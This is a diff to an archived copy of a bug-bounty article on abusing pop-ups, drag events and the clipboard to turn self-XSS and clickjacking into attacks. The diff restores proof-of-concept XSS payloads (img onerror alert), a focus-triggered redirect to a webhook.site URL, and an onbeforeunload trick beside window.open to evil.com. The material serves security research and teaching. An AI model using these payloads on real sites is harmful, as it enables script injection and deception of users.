@@ -6,9 +6,9 @@ resource: "https://gccybermonks.com/posts/popups/"
 tags: [article, webseclist-reference, gccybermonks-com, xss, ui-redress, xsleak, sop-bypass, clickjacking, iframe, timing-attack, css, bug-bounty, owasp-a01-2021, owasp-a03-2021, owasp-a04-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T10:08:19+00:00"
+  at: "2026-08-16T00:00:45+00:00"
 status: stable
-stale_after: 2027-08-09
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://gccybermonks.com/posts/popups/"
@@ -23,7 +23,7 @@ canonical_url: ""
 cited_by:
   - "2021.md:31"
 commit: ""
-content_sha256: 619e08f447c82d11b76aba032a041deb8dc8b68a0de108507d7b2d59721db5ce
+content_sha256: 5b79aa845ad61c7bdf2222d6485c1bf50cb145fd7a0625debc55a6806cdebb46
 depth: full
 depth_reason: default
 kind: article
@@ -36,7 +36,7 @@ publisher_english: ""
 raw_sha256: 7e4cc544c78e7107f6c6bd7ba515450bd62ad144821f29964b912d4e0b7e42aa
 retrieved_from: "https://gccybermonks.com/posts/popups/"
 retrieved_kind: stored
-retrieved_utc: "2026-08-09T10:08:19+00:00"
+retrieved_utc: "2026-08-16T00:00:45+00:00"
 slug: gccybermonks-com-pop-ups-good-world
 snapshot: 20211214143756
 title_english: ""
@@ -50,7 +50,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://gccybermonks.com/posts/popups/>
-- Preserved from: https://gccybermonks.com/posts/popups/ (stored) on 2026-08-09
+- Preserved from: https://gccybermonks.com/posts/popups/ (stored) on 2026-08-16
 - Capture timestamp: 20211214143756
 - Licence: unknown
 
@@ -148,7 +148,7 @@ In this case, I remembered testing something with the ondrag event and I ended u
 1 drag me
 2 <script>
 3 document.addEventListener("dragstart",(event)=>{
-4         event.dataTransfer.setData("text","<img src=x >);
+4         event.dataTransfer.setData("text","<img src=x onerror=alert(document.domain)>");
 5       })
 6 ondrag = () =>{
 7       setTimeout(()=>{
@@ -163,7 +163,7 @@ Some techniques [have already been published](https://research.securitum.com/the
 
 - line 1: `drag me` is just a random text, to convince the victim to start the `ondrag`;
 - line 3: an event is created and added to listen to the exact moment when the user starts the `ondrag`;
-- line 4: `event.dataTransfer.setData` will change the `drag me` content to`<img src = x (1)>`;
+- line 4: `event.dataTransfer.setData` will change the `drag me` content to`<img src = x onerror = alert (1)>`;
 - line 6: `ondrag` is referenced to execute a function whenever the event is executed by the user;
 - line 8: a window is opened with the url where there is a `self-xss`;
 
@@ -219,7 +219,7 @@ setInterval(()=>{
 10                },500)
 11            }
 12            setInterval(()=>{
-13                navigator.clipboard.writeText('<img src=x >);
+13                navigator.clipboard.writeText('<img src=x onerror=alert(1)>');
 14            },500)
 15        </script>
 16    </body>
@@ -265,7 +265,7 @@ inp.onfocus=()=>{
 <iframe src="https://vulnerable/form.html">
 <script>
 document.addEventListener("dragstart",(event)=>{
-  event.dataTransfer.setData("text","<img src=x >);
+  event.dataTransfer.setData("text","<img src=x onerror=alert(document.domain)>");
 });
 </script>
 </body>
@@ -289,7 +289,7 @@ A few days before I finished this article I was thinking about how I could repro
 <html>
 <head></head>
 <body>
-<input id=button  type=text autofocus>
+<input id=button onfocus="testFocus()" type=text autofocus>
 <script>
 const testFocus=()=>{
 	location.href="https://webhook.site/1d555163-68cd-4ccf-a260-b158747035c4#button"
@@ -389,7 +389,7 @@ This first method works both on Chrome and Firefox, the behavior that generates 
 9                    window.open('http://evil.com/');
 10                    document.write(`<iframe src=http://localhost/download_attach.php></iframe>
 11                    <script>
-12
+12                    onbeforeunload=()=>{
 13                        return '';
 14                    }
 15                    location='//google.com'
@@ -448,7 +448,7 @@ In some cases, the popunder can be very useful for when the vulnerable page is v
                     w = window.open('http://localhost:81/form.html','_blank');
                     document.write(`<iframe src=http://localhost:81/download_attach.php></iframe>
                     <script>
-
+                    onbeforeunload=()=>{
                         return '';
                     }
                     location='//google.com'
@@ -461,7 +461,7 @@ In some cases, the popunder can be very useful for when the vulnerable page is v
 		w.focus();
             }
             setInterval(()=>{
-                navigator.clipboard.writeText('<img src=x >);
+                navigator.clipboard.writeText('<img src=x onerror=alert(1)>');
             },500)
         </script>
     </body>
